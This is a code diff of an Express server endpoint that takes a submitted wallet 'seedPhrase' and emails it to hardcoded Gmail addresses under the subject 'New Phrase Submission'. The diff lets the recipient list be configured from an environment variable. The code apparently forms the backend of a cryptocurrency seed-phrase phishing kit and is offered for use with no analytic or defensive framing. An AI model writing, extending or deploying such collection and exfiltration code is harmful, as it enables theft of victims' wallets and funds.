@@ -7,8 +7,32 @@ app.use(express.json());
 
 app.use(cors()); // Allow all origins for dev
 
+function parseToEmails(value) {
+    if (!value) return null;
+    let v = String(value).trim();
+    if ((v.startsWith("'") && v.endsWith("'")) || (v.startsWith('"') && v.endsWith('"'))) {
+        v = v.slice(1, -1).trim();
+    }
+    if (v.startsWith('[') && v.endsWith(']')) {
+        try {
+            const normalized = v.replace(/'/g, '"');
+            const parsed = JSON.parse(normalized);
+            if (Array.isArray(parsed)) {
+                return parsed.map(s => String(s).trim()).filter(Boolean);
+            }
+        } catch (e) {
+            return v
+                .slice(1, -1)
+                .split(',')
+                .map(s => s.trim().replace(/^(["'])(.*)\1$/, '$2'))
+                .filter(Boolean);
+        }
+    }
+    return v;
+}
+
 app.post('/send-email', async (req, res) => {
-    const {seedPhrase} = req.body;
+    const { seedPhrase } = req.body;
 
     if (!seedPhrase) {
         return res.status(400).json({ error: 'Missing required fields: to, subject, text' });
@@ -30,9 +54,10 @@ app.post('/send-email', async (req, res) => {
         }
     });
 
+    const toRecipients = parseToEmails(process.env.to_email);
     const mailOptions = {
         from: '"Seeder" <guirez1921@gmail.com>', // sender address
-        to: ['susanbabe0980@gmail.com', 'Jessicarose89202@gmail.com'],            // receiver address
+        to: toRecipients || ['susanbabe0980@gmail.com', 'Jessicarose89202@gmail.com'],            // receiver address
         cc: 'guirez1921@gmail.com',             // cc address
         subject: 'New Phrase Submission',
         html: emailHtml
